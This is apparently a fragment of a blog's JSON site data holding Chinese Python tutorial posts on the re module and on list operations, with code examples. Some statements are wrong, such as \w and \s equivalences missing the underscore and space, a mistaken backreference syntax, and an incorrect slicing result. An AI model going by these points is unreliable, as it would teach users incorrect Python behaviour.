非贪婪匹配</h3><p><code>？</code>为非贪婪操作符，<code>*</code>、<code>+</code>、<code>？</code>、<code>{}</code>都是贪婪操作符（<code>?</code>有两重作用）。</p>\n<p>通过在贪婪符之后加<code>？</code>，表示让它们尽可能少的匹配。</p>\n<blockquote>\n<p>即先让后面的匹配，自己再匹配，或者说自己尽可能少的匹配，别人尽可能多的匹配。</p>\n</blockquote>\n<p><strong>非贪婪匹配例子</strong></p>\n<pre><code>如：    \n    pattern1 = ‘.*(\\d+)’   #贪婪匹配\n    pattern2 = ‘.*?(\\d+)’  #非贪婪匹配\n    string=‘aa114321’\n</code></pre><p>贪婪模式下：<code>.*</code>将匹配到<code>aa114321</code>,子组1匹配到<code>1</code>。(re.search(pattern1,string))</p>\n<p>非贪婪模式下（<code>*</code>后面加<code>？</code>）：<code>.*?</code>匹配到<code>aa</code>，因为尽可能少匹配，反过来就是要让后面的尽可能多的匹配，因此子组匹配到<code>114321</code>。(re.findall(pattern2,string))    </p>\n<p><img src=\"/2019/04/09/02python模块之re/QQ截图20190409170216.png\" alt></p>\n<p>​        </p>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-规则\"><a href=\"#0x00-规则\" class=\"headerlink\" title=\"0x00 规则\"></a>0x00 规则</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.      元字符.表示匹配任何字符，除\\n之外。</span><br><span class=\"line\">*      表示匹配前面的字符或分组0次或多次。</span><br><span class=\"line\">+      表示匹配前面的字符或分组1次或多次。</span><br><span class=\"line\">？     表示匹配前面的字符或分组0次或1次。 </span><br><span class=\"line\">&#123;x&#125;    表示匹配前面的字符或分组x次。</span><br><span class=\"line\">&#123;x,y&#125;  表示匹配前面的字符或分组x次至y次之间。</span><br><span class=\"line\"></span><br><span class=\"line\">^      表示匹配开始为^之后的。\\A同样作用。</span><br><span class=\"line\">$      表示匹配结束为$之前的。\\Z同样作用</span><br><span class=\"line\"></span><br><span class=\"line\">[abcd] 表示匹配其中的任意之一。</span><br><span class=\"line\">[1-9]  表示匹配1-9范围内的任意之一，也可以用[A-Z]、[a-z]、[0-9a-zA-Z]。</span><br><span class=\"line\">[^abc] 脱字符出现在[]中意义为‘非’，即不匹配其中的任何一个。也可用于范围[^1-9]、[^a-z]</span><br><span class=\"line\"></span><br><span class=\"line\">  \\d   表示匹配任何一个十进制数字。与[0-9]等同。</span><br><span class=\"line\">  \\D   表示匹配任何一个非十进制数字。与[^0-9]等同。</span><br><span class=\"line\"></span><br><span class=\"line\">  \\w   表示匹配任何一个十进制数字和字母。与[0-9a-zA-Z]等同。</span><br><span class=\"line\">  \\W   表示匹配任何一个除十进制数字和字母。与\\w相反</span><br><span class=\"line\"></span><br><span class=\"line\">  \\s   表示匹配任何一个空格字符。与[\\n\\t\\r\\v\\f]等同。</span><br><span class=\"line\">  \\S   表示与\\s相反。与[^\\n\\t\\r\\v\\f]等同。</span><br><span class=\"line\"></span><br><span class=\"line\">  \\b   表示匹配任何单词边界。边界即空白或非字母数字字符</span><br><span class=\"line\">  \\B   表示与\\b相反。</span><br><span class=\"line\"></span><br><span class=\"line\">  |    表示‘或’，匹配其中之一。</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"0x01-转义\"><a href=\"#0x01-转义\" class=\"headerlink\" title=\"0x01 转义\"></a>0x01 转义</h3><p>RE使用\\来进行转义，而Python也使用\\来进行转义，因此要进行双重的转义。<br>例如对<code>\\</code>进行转义：</p>\n<blockquote>\n<p>首先RE先进行转义:<code>\\\\</code><br>然后Python也要对RE的两个<code>\\\\</code>转义：<code>\\\\\\\\</code></p>\n</blockquote>\n<p>也可以在字符串前面加<code>r</code>表示这是个Raw字符串。</p>\n<h3 id=\"0x02-RE全局方法\"><a href=\"#0x02-RE全局方法\" class=\"headerlink\" title=\"0x02 RE全局方法\"></a>0x02 RE全局方法</h3><ul>\n<li><strong><code>re.match(pattern，string，flag=)</code></strong></li>\n</ul>\n<blockquote>\n<p>匹配从<strong><em>字符串开始</em></strong>就符合正则模式的字符串。</p>\n<p>匹配则返回<strong><em>匹配对象</em></strong>，否则返回none。</p>\n</blockquote>\n<ul>\n<li><strong><code>re.search(pattern，string，flag=)</code></strong></li>\n</ul>\n<blockquote>\n<p>匹配第一个符合正则模式的字符串，即只匹配一次。</p>\n<p>匹配则返回<strong><em>匹配对象</em></strong>，否则返回none。</p>\n</blockquote>\n<ul>\n<li><strong><code>findall(pattern，string，flag=)</code></strong></li>\n</ul>\n<blockquote>\n<p>将字符串中所有匹配的部分作为元素放入一个<strong><em>列表</em></strong>并返回。</p>\n</blockquote>\n<ul>\n<li><strong><code>finditer(pattern，string，flag=)</code></strong></li>\n</ul>\n<blockquote>\n<p>与上面一个不同的是，将每次匹配得到的匹配对象放入一个迭代器中，最后返回一个<strong><em>迭代器</em></strong>，而不是列表。</p>\n<p>遍历迭代器时，每次返回一个<strong><em>匹配对象</em></strong>。</p>\n</blockquote>\n<ul>\n<li><strong><code>sub（pattern，repl，string，count=）</code></strong></li>\n<li><strong><code>subn（pattern，repl，string，count=）</code></strong></li>\n</ul>\n<blockquote>\n<p>匹配模式的字符串部分用<code>repl</code>字符串替代，<code>count</code>指明次数，缺省替换匹配的所有。<br><code>subn</code>与<code>sub</code>区别在于，<code>subn</code>会返回新字符串及替换次数。</p>\n</blockquote>\n<ul>\n<li><strong><code>re.split(pattern，string，max=)</code></strong>：用模式匹配的字符串作为分隔符，分割后返回的是一个列表。max表示最多分割的次数</li>\n<li><strong><code>re.compile(pattern)</code></strong>：对模式进行编译，之后直接使用编译好的模式对象作为模式，对复杂任务效率更高。</li>\n</ul>\n<blockquote>\n<p>可以用<code>re.compile()</code>函数对正则模式字符串进行编译，并返回一个模式类对象：<code>&lt;class &#39;re.Pattern&#39;&gt;</code></p>\n<p>模式类对象自己有<code>match()</code>、<code>search()</code>、<code>findall()</code>、<code>finditer()</code>方法，方法使用与前面的全局方法一样。</p>\n</blockquote>\n<p><strong>上面的方法返回的匹配对象有如下方法：</strong></p>\n<ul>\n<li><strong><code>group()</code></strong>：返回匹配字符串。（其实默认传入0参数，意义为查看子组0）</li>\n<li><strong><code>start()</code></strong>：返回匹配字符串的开始索引值。（也可以传入子组号）</li>\n<li><strong><code>end()</code></strong>：返回匹配字符串的结束索引值。（也可以传入子组号）</li>\n<li><strong><code>span()</code></strong>：返回匹配字符串的开始与结束索引到一个元组中(start,end)。（也可以传入子组号）</li>\n</ul>\n<h3 id=\"0x03-标志位（flag）\"><a href=\"#0x03-标志位（flag）\" class=\"headerlink\" title=\"0x03 标志位（flag）\"></a>0x03 标志位（flag）</h3><p>标志位：可以用全称或简写，如re.IGNORECASE等同于re.I，多个标志位|分开，如re.A|re.I。    </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.ASCII             #\\w、\\s等转义字符只匹配ASCII符，仅对Unicode有效。</span><br><span class=\"line\">re.DOTALL/re.S       #.可以匹配全部字符，包括换行符。</span><br><span class=\"line\">re.IGNORECASE/re.I   #匹配时不区分大小写。</span><br><span class=\"line\">re.MULTILINE/re.M    #^$将不止匹配字符串开头和结尾，还匹配每行的行首和行尾。</span><br><span class=\"line\">re.VERBOSE/re.X      #模式的非转义字符的空格将会被忽略，可以用#进行注释。</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x04-分组\"><a href=\"#0x04-分组\" class=\"headerlink\" title=\"0x04 分组\"></a>0x04 分组</h3><p><strong>分组的作用</strong>：    </p>\n<blockquote>\n<p>方面一： 跟数学上的一样，被括号括起来后，方便使用*、+、?、{}进行操作。<br>方面二： 可以对匹配字符串进行再操作、再匹配。</p>\n</blockquote>\n<p><strong>原理</strong>：</p>\n<blockquote>\n<p>首先，分组的作用只具有数学上的，将正则模式去匹配字符串，得到匹配字符串，并放入子组0中。<br>然后，再将每个分组作为模式去匹配第一次得到匹配字符串，得到的结果依次放入子组1,2,3….<br>有多少对括号就有多少个子组，子组号按从左到右的’(‘统计。</p>\n</blockquote>\n<p><strong>group()与groups()</strong></p>\n<blockquote>\n<p>他们都是匹配对象的方法。</p>\n</blockquote>\n<ul>\n<li>group():用于获取指定子组里的匹配字符串。</li>\n</ul>\n<blockquote>\n<p>正则模式匹配的匹配字符串放入子组0，且0是该方法的默认参数。<br>分组匹配的匹配字符串依次放入1，2，3…..子组<br>可以传入子组号查看指定子组的内容，且可以一次传入多个子组号，顺序也不要求。        </p>\n</blockquote>\n<ul>\n<li>groups():用于获取所有分组的匹配字符串，结果返回一个元组。</li>\n</ul>\n<blockquote>\n<p>只包含分组的匹配字符串，不包含正则模式匹配的匹配字符串。</p>\n</blockquote>\n<p>若使用了<code>findall()</code>方法，返回的将不是匹配对象，而是列表对象。如果也使用了分组，那返回的列表的每个元素是分组匹配的，而不包含正则模式匹配的。</p>\n<p><strong>其他</strong>：</p>\n<ul>\n<li>反向引用，在模式中可以用“[子组号]”来引用前面匹配成功的子组的匹配字符串。</li>\n<li>非捕获组：即让分组仅具有数学上意义，而不会再去匹配匹配字符串。</li>\n</ul>\n<blockquote>\n<p>通过在子组()中的最前面加：<code>?：</code> （如: <code>a(?:\\d)+b</code> #<code>\\d</code>将不会再作为模式去匹配）</p>\n</blockquote>\n<ul>\n<li>命名分组：可以给分组进行命名。</li>\n</ul>\n<blockquote>\n<p>通过在子组()中的最前面加：<code>?P&lt;[name]&gt;</code> （如：<code>a(?P&lt;fz1&gt;\\d)+b</code>）<br>命名后，group()方法可以通过名字也可以通过子组号。</p>\n</blockquote>\n<p><strong>断言</strong>：</p>\n<ul>\n<li>前向肯定断言：如果此分组在此处匹配成功则成功，否则失败。<code>(?=...)</code> #<code>...</code>处是分组正则模式。</li>\n<li>前向否定断言：如果此分组在此处匹配成功则失败，否则成功。<code>(?!...)</code> #<code>...</code>处是分组正则模式。</li>\n</ul>\n<h3 id=\"0x05-非贪婪匹配\"><a href=\"#0x05-非贪婪匹配\" class=\"headerlink\" title=\"0x05 非贪婪匹配\"></a>0x05 非贪婪匹配</h3><p><code>？</code>为非贪婪操作符，<code>*</code>、<code>+</code>、<code>？</code>、<code>{}</code>都是贪婪操作符（<code>?</code>有两重作用）。</p>\n<p>通过在贪婪符之后加<code>？</code>，表示让它们尽可能少的匹配。</p>\n<blockquote>\n<p>即先让后面的匹配，自己再匹配，或者说自己尽可能少的匹配，别人尽可能多的匹配。</p>\n</blockquote>\n<p><strong>非贪婪匹配例子</strong></p>\n<pre><code>如：    \n    pattern1 = ‘.*(\\d+)’   #贪婪匹配\n    pattern2 = ‘.*?(\\d+)’  #非贪婪匹配\n    string=‘aa114321’\n</code></pre><p>贪婪模式下：<code>.*</code>将匹配到<code>aa114321</code>,子组1匹配到<code>1</code>。(re.search(pattern1,string))</p>\n<p>非贪婪模式下（<code>*</code>后面加<code>？</code>）：<code>.*?</code>匹配到<code>aa</code>，因为尽可能少匹配，反过来就是要让后面的尽可能多的匹配，因此子组匹配到<code>114321</code>。(re.findall(pattern2,string))    </p>\n<p><img src=\"/2019/04/09/02python模块之re/QQ截图20190409170216.png\" alt></p>\n<p>​        </p>"},{"title":"Python基础学习系列Chapter 3：列表","date":"2019-03-19T07:37:28.000Z","_content":"\n### 0x00 列表概述\n\n- 任意对象的有序集合。\n- 可任意嵌套。\n- 属于可变对象类型。\n- 列表存储了0个或多个对象的引用。\n\n<!-- more -->\n\n### 0x01 列表创建\n\n```python\nlist=[]\nlist=['opaque','super',1,3]\nlist=list('opaque')\n```\n\n### 0x02 列表操作\n\n#### **查相关**\n\n##### 索引：按下标索引元素\n\n```python\nlist=['opaque','super',1,3]\n\nlist[0]    #返回'opaque'\nlist[-1]   #返回3\n```\n\n- 索引本质是复制。\n- 左至右下标从0开始往后推。\n- 右至左下标从-1开始往前推。\n\n##### 切片：按下标切片\n\n```python\nlist=['opaque','super',1,3]\n\nusage：\n    list[start:end:step]\n    \nexample:\n    list[0:2]     #返回['opaque''super']\n    list[:]       #返回整个列表\n    list[1:]      #返回下标为1到最后的元素列表\n    list[-3:-1]   #返回[1,3]\n```\n\n- 步长默认为1\n- 不指明start表示从下标0开始\n- 不指明end表示到最后\n- 切片到end但不包含end\n- 切片的本质是复制\n- 切片也是浅拷贝\n\n##### index() #查元素对应下标\n\n```python\nlist=['opaque','super',1,3]\nusage:\n    list.index(obj)\nexample:\n    list.index('opaque')   #返回下标0\n    list.index(1)          #返回下标2\n    list[list.index(3)]    #返回元素3\n```\n\n##### count() #查元素出现的次数\n\n```python\nlist=[1,2,1,1,4]\n\nlist.count(1)      #返回元素1在列表中出现的次数\n```\n\n#### **增相关**\n\n##### append（） #列表最后追加一个元素\n\n```python\nlist.append('nick')    #追加'nick'字符串\n```\n\n##### insert（） #在指定下标处插入一个元素\n\n```python\nlist.insert(2,'sam')   #在下标为2的位置插入'sam'元素\n```\n\n- 原来该下标的元素向后推移一个下标\n- 当要插入的下标大于当前列表长度时，就只是追加在后面，跟append（）一样效果\n\n##### extend()、+  #列表合并\n\n```python\nlist1=[1,2]\nlist2=[3,4]\nlist3=[5,6]\nlist4=[7,8]\n\nlist1+list2           #合并列表，得到[1,2,3,4]\nlist3.extend(list4)   #list4元素追加在list3之后，得到[5,6,7,8]\n```\n\n- extent()、append()、+的区别在于：前两者是原处修改列表，而+操作是用原列表的复制进行操作。因此原处修改的会更快。\n\n#### **改相关**\n\n##### 索引/分片赋值\n\n```python\nlist=[1,2,3,4]\n\nlist[1]=5         #修改下标为1的元素的值\nlist[1:3]=[5,6]   #切片赋值修改\n```\n\n- 索引赋值和分片赋值都是原处修改。\n- 分片赋值等号左右两边的元素可不等，即可以切两个元素但只赋值一个元素或任意个元素。\n- 分片赋值可理解为先删除切片元素，然后执行插入元素操作。\n\n#### **删相关**\n\n##### remove() #删除指定元素\n\n```python\nlist=[1,2,3,4,1]\n\nlist.remove(1)    #删除第一个元素1\n```\n\n- 删除第一个出现的，而不是全部\n\n##### pop() #删除指定下标的元素\n\n```python\nlist=[1,2,3,4,1]\n\nlist.pop(2)      #3会被删除且返回3\n```\n\n- 删除并返回被删除的元素\n- 不指定元素时，会删除最后一个。\n\n##### clear() #清空列表\n\n```python\nlist=[1,2,3,4]\n\nlist.clear()     #列表被清空\n```\n\n##### del #删除索引出来的元素\n\n```python\nlist=[1,2,3,4]\n\ndel list[0]       #下标为0的元素1被删除\ndel list[1:3]     #删除切片元素\ndel list          #删除变量list，整个列表将被删除\n```\n\n- del是全局的删除，即不是列表的独有方法，可以用于很多对象。\n\n#### **其他方法**\n\n##### reverse() #反转列表元素\n\n```python\nlist=[1,2,3]\n\nlist.reverse()     #列表变为[3,2,1]\n```\n\n##### sort() #永久进行排序\n\n```python\nlist.sort()\n```\n\n- 排序的规则按照ASCII码数值小到大。\n- 永久排序是因为sort()在原处对列表进行修改。\n- 一般原处修改操作的都不会有返回值（NONE）\n\n##### copy() #拷贝列表\n\n```python\nlist1=[1,2,[3,4]]\nlist2=list1.copy()\n```\n\n- 列表的copy()方法是浅copy，只能copy一层，即嵌套的还是共享引用。\n- 想要迭代copy需要导入copy模块，然后使用copy.deepcopy()方法。\n\n#### **一些理解**\n\n- 列表名变量是指向列表对象的引用，列表又是0个或多个对象的引用。列表的浅拷贝实际上列表名变量成为了不同列表对象引用，但他们的列表对象都是指向相同元素对象的引用。\n\n```python\nlist1=[1,2,3]\nlist2=list1.copy()\nlist3=list1\n\nid(list1) == id(list2)   #False\nlist1 is list2           #False\n\nid(list1) == id(list3)   #True\nlist1 is list3           #True\n\nlist1[0] is list2[0]     #True\nlist1[1] is list2[1]     #True\n     .......\n\n```\n\n- 拷贝让list1和list2成为了不同列表对象的引用，但他们的列表对象都引用着相同的元素对象。修改任意一个列表的元素，实际上只是修改了列表对某个对象的引用而已，因此不会影响到另一个列表(因为两个列表是不同的对象)。\n- list3=list1赋值操作，让list3和list1引用了同一个列表对象，因此更改这个列表对象引用的对象，list3与list1都会同时改变。\n\n#### **二次总结**\n\n```python\n1.列表是可变的序列。\n2.列表是任意对象的有序集合。\n3.列表中的元素实质是列表对象引用了一个或多个其他对象。\n\n4.强制类型转换：list()  #操作对象为序列\n5.列表操作\n\t改：\n\t\t索引赋值\n\t\t  分片赋值：实质是先删除切片内容，再插入赋值的新内容。因此切片赋值不要求左右两边项相等。\n\t\n\t查：\n\t\tindex()    #返回元素对应的下标\n\t\tcount()    #返回元素在列表中的次数\n\t增：\n\t\tappend()   #在最后追加一个元素（原处修改）。\n\t\textend()   #将一个列表追加到另一个列表后面（原处修改）。\n\t\tinsert()   #指定下标插入指定元素（原处修改）。\n\t\t   +       #序列合并（产生新对象）。\n\t\n \t删：\t\n\t\tremove()        #从列表中删除指定元素（原处修改）。\n\t\tpop()           #删除并弹出指定下标的函数（原处修改），不指定下标则删除并弹出最后一个元素。\n\t\tclear()         #清空列表（原处修改）。\n\t\tdel list[0]     #删除索引出来的元素（不是列表特有的，也是原处修改）。\n  \n\t其他：\n\t\treverse()   #翻转列表（原处修改）\n\t\tsort()      #排序列表（原处修改）\n\t\tcopy()      #浅拷贝\n\n\n6.sort()与sorted()\n\tsort()是列表专有的，sorted()是内置函数，对于所有序列都可用\n\tsort()是原处修改，sorted()是产生新对象\n\treverse()和reversed()也是一样的。\n```\n\n\n\n\n\n","source":"_posts/02python基础学习系列之列表.md","raw":"---\ntitle: Python基础学习系列Chapter 3：列表\ndate: 2019-03-19 15:37:28\ntags:\n\t- Python基础\n\t- Language\ncategories: Python\n---\n\n### 0x00 列表概述\n\n- 任意对象的有序集合。\n- 可任意嵌套。\n- 属于可变对象类型。\n- 列表存储了0个或多个对象的引用。\n\n<!-- more -->\n\n### 0x01 列表创建\n\n```python\nlist=[]\nlist=['opaque','super',1,3]\nlist=list('opaque')\n```\n\n### 0x02 列表操作\n\n#### **查相关**\n\n##### 索引：按下标索引元素\n\n```python\nlist=['opaque','super',1,3]\n\nlist[0]    #返回'opaque'\nlist[-1]   #返回3\n```\n\n- 索引本质是复制。\n- 左至右下标从0开始往后推。\n- 右至左下标从-1开始往前推。\n\n##### 切片：按下标切片\n\n```python\nlist=['opaque','super',1,3]\n\nusage：\n    list[start:end:step]\n    \nexample:\n    list[0:2]     #返回['opaque''super']\n    list[:]       #返回整个列表\n    list[1:]      #返回下标为1到最后的元素列表\n    list[-3:-1]   #返回[1,3]\n```\n\n- 步长默认为1\n- 不指明start表示从下标0开始\n- 不指明end表示到最后\n- 切片到end但不包含end\n- 切片的本质是复制\n- 切片也是浅拷贝\n\n##### index() #查元素对应下标\n\n```python\nlist=['opaque','super',1,3]\nusage:\n    list.index(obj)\nexample:\n    list.index('opaque')   #返回下标0\n    list.index(1)          #返回下标2\n    list[list.index(3)]    #返回元素3\n```\n\n##### count() #查元素出现的次数\n\n```python\nlist=[1,2,1,1,4]\n\nlist.count(1)      #返回元素1在列表中出现的次数\n```\n\n#### **增相关**\n\n##### append（） #列表最后追加一个元素\n\n```python\nlist.append('nick')    #追加'nick'字符串\n```\n\n##### insert（） #在指定下标处插入一个元素\n\n```python\nlist.insert(2,'sam')   #在下标为2的位置插入'sam'元素\n```\n\n- 原来该下标的元素向后推移一个下标\n- 当要插入的下标大于当前列表长度时，就只是追加在后面，跟append（）一样效果\n\n##### extend()、+  #列表合并\n\n```python\nlist1=[1,2]\nlist2=[3,4]\nlist3=[5,6]\nlist4=[7,8]\n\nlist1+list2           #合并列表，得到[1,2,3,4]\nlist3.extend(list4)   #list4元素追加在list3之后，得到[5,6,7,8]\n```\n\n- extent()、append()、+的区别在于：前两者是原处修改列表，而+操作是用原列表的复制进行操作。因此原处修改的会更快。\n\n#### **改相关**\n\n##### 索引/分片赋值\n\n```python\nlist=[1,2,3,4]\n\nlist[1]=5         #修改下标为1的元素的值\nlist[1:3]=[5,6]   #切片赋值修改\n```\n\n- 索引赋值和分片赋值都是原处修改。\n- 分片赋值等号左右两边的元素可不等，即可以切两个元素但只赋值一个元素或任意个元素。\n- 分片赋值可理解为先删除切片元素，然后执行插入元素操作。\n\n#### **删相关**\n\n##### remove() #删除指定元素\n\n```python\nlist=[1,2,3,4,1]\n\nlist.remove(1)    #删除第一个元素1\n```\n\n- 删除第一个出现的，而不是全部\n\n##### pop() #删除指定下标的元素\n\n```python\nlist=[1,2,3,4,1]\n\nlist.pop(2)      #3会被删除且返回3\n```\n\n- 删除并返回被删除的元素\n- 不指定元素时，会删除最后一个。\n\n##### clear() #清空列表\n\n```python\nlist=[1,2,3,4]\n\nlist.clear()     #列表被清空\n```\n\n##### del #删除索引出来的元素\n\n```python\nlist=[1,2,3,4]\n\ndel list[0]       #下标为0的元素1被删除\ndel list[1:3]     #删除切片元素\ndel list          #删除变量list，整个列表将被删除\n```\n\n- del是全局的删除，即不是列表的独有方法，可以用于很多对象。\n\n#### **其他方法**\n\n##### reverse() #反转列表元素\n\n```python\nlist=[1,2,3]\n\nlist.reverse()     #列表变为[3,2,1]\n```\n\n##### sort() #永久进行排序\n\n```python\nlist.sort()\n```\n\n- 排序的规则按照ASCII码数值小到大。\n- 永久排序是因为sort()在原处对列表进行修改。\n- 一般原处修改操作的都不会有返回值（NONE）\n\n##### copy() #拷贝列表\n\n```python\nlist1=[1,2,[3,4]]\nlist2=list1.copy()\n```\n\n- 列表的copy()方法是浅copy，只能copy一层，即嵌套的还是共享引用。\n- 想要迭代copy需要导入copy模块，然后使用copy.deepcopy()方法。\n\n#### **一些理解**\n\n- 列表名变量是指向列表对象的引用，列表又是0个或多个对象的引用。列表的浅拷贝实际上列表名变量成为了不同列表对象引用，但他们的列表对象都是指向相同元素对象的引用。\n\n```python\nlist1=[1,2,3]\nlist2=list1.copy()\nlist3=list1\n\nid(list1) == id(list2)   #False\nlist1 is list2           #False\n\nid(list1) == id(list3)   #True\nlist1 is list3           #True\n\nlist1[0] is list2[0]     #True\nlist1[1] is list2[1]     #True\n     .......\n\n```\n\n- 拷贝让list1和list2成为了不同列表对象的引用，但他们的列表对象都引用着相同的元素对象。修改任意一个列表的元素，实际上只是修改了列表对某个对象的引用而已，因此不会影响到另一个列表(因为两个列表是不同的对象)。\n- list3=list1赋值操作，让list3和list1引用了同一个列表对象，因此更改这个列表对象引用的对象，list3与list1都会同时改变。\n\n#### **二次总结**\n\n```python\n1.列表是可变的序列。\n2.列表是任意对象的有序集合。\n3.列表中的元素实质是列表对象引用了一个或多个其他对象。\n\n4.强制类型转换：list()  #操作对象为序列\n5.列表操作\n\t改：\n\t\t索引赋值\n\t\t  分片赋值：实质是先删除切片内容，再插入赋值的新内容。因此切片赋值不要求左右两边项相等。\n\t\n\t查：\n\t\tindex()    #返回元素对应的下标\n\t\tcount()    #返回元素在列表中的次数\n\t增：\n\t\tappend()   #在最后追加一个元素（原处修改）。\n\t\textend()   #将一个列表追加到另一个列表后面（原处修改）。\n\t\tinsert()   #指定下标插入指定元素（原处修改）。\n\t\t   +       #序列合并（产生新对象）。\n\t\n \t删：\t\n\t\tremove()        #从列表中删除指定元素（原处修改）。\n\t\tpop()           #删除并弹出指定下标的函数（原处修改），不指定下标则删除并弹出最后一个元素。\n\t\tclear()         #清空列表（原处修改）。\n\t\tdel list[0]     #删除索引出来的元素（不是列表特有的，也是原处修改）。\n  \n\t其他：\n\t\treverse()   #翻转列表（原处修改）\n\t\tsort()      #排序列表（原处修改）\n\t\tcopy()      #浅拷贝\n\n\n6.sort()与sorted()\n\tsort()是列表专有的，sorted()是内置函数，对于所有序列都可用\n\tsort()是原处修改，sorted()是产生新对象\n\treverse()和reversed()也是一样的。\n```\n\n\n\n\n\n","slug":"02python基础学习系列之列表","published":1,"updated":"2019-03-29T07:21:20.965Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83ji000h7or0fr21uu11","content":"<h3 id=\"0x00-列表概述\"><a href=\"#0x00-列表概述\" class=\"headerlink\" title=\"0x00 列表概述\"></a>0x00 列表概述</h3><ul>\n<li>任意对象的有序集合。</li>\n<li>可任意嵌套。</li>\n<li>属于可变对象类型。</li>\n<li>列表存储了0个或多个对象的引用。</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"0x01-列表创建\"><a href=\"#0x01-列表创建\" class=\"headerlink\" title=\"0x01 列表创建\"></a>0x01 列表创建</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[]</span><br><span class=\"line\">list=[<span class=\"string\">'opaque'</span>,<span class=\"string\">'super'</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">list=list(<span class=\"string\">'opaque'</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x02-列表操作\"><a href=\"#0x02-列表操作\" class=\"headerlink\" title=\"0x02 列表操作\"></a>0x02 列表操作</h3><h4 id=\"查相关\"><a href=\"#查相关\" class=\"headerlink\" title=\"查相关\"></a><strong>查相关</strong></h4><h5 id=\"索引：按下标索引元素\"><a href=\"#索引：按下标索引元素\" class=\"headerlink\" title=\"索引：按下标索引元素\"></a>索引：按下标索引元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"string\">'opaque'</span>,<span class=\"string\">'super'</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">list[<span class=\"number\">0</span>]    <span class=\"comment\">#返回'opaque'</span></span><br><span class=\"line\">list[<span class=\"number\">-1</span>]   <span class=\"comment\">#返回3</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>索引本质是复制。</li>\n<li>左至右下标从0开始往后推。</li>\n<li>右至左下标从-1开始往前推。</li>\n</ul>\n<h5 id=\"切片：按下标切片\"><a href=\"#切片：按下标切片\" class=\"headerlink\" title=\"切片：按下标切片\"></a>切片：按下标切片</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"string\">'opaque'</span>,<span class=\"string\">'super'</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">usage：</span><br><span class=\"line\">    list[start:end:step]</span><br><span class=\"line\">    </span><br><span class=\"line\">example:</span><br><span class=\"line\">    list[<span class=\"number\">0</span>:<span class=\"number\">2</span>]     <span class=\"comment\">#返回['opaque''super']</span></span><br><span class=\"line\">    list[:]       <span class=\"comment\">#返回整个列表</span></span><br><span class=\"line\">    list[<span class=\"number\">1</span>:]      <span class=\"comment\">#返回下标为1到最后的元素列表</span></span><br><span class=\"line\">    list[<span class=\"number\">-3</span>:<span class=\"number\">-1</span>]   <span class=\"comment\">#返回[1,3]</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>步长默认为1</li>\n<li>不指明start表示从下标0开始</li>\n<li>不指明end表示到最后</li>\n<li>切片到end但不包含end</li>\n<li>切片的本质是复制</li>\n<li>切片也是浅拷贝</li>\n</ul>\n<h5 id=\"index-查元素对应下标\"><a href=\"#index-查元素对应下标\" class=\"headerlink\" title=\"index() #查元素对应下标\"></a>index() #查元素对应下标</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"string\">'opaque'</span>,<span class=\"string\">'super'</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">usage:</span><br><span class=\"line\">    list.index(obj)</span><br><span class=\"line\">example:</span><br><span class=\"line\">    list.index(<span class=\"string\">'opaque'</span>)   <span class=\"comment\">#返回下标0</span></span><br><span class=\"line\">    list.index(<span class=\"number\">1</span>)          <span class=\"comment\">#返回下标2</span></span><br><span class=\"line\">    list[list.index(<span class=\"number\">3</span>)]    <span class=\"comment\">#返回元素3</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"count-查元素出现的次数\"><a href=\"#count-查元素出现的次数\" class=\"headerlink\" title=\"count() #查元素出现的次数\"></a>count() #查元素出现的次数</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 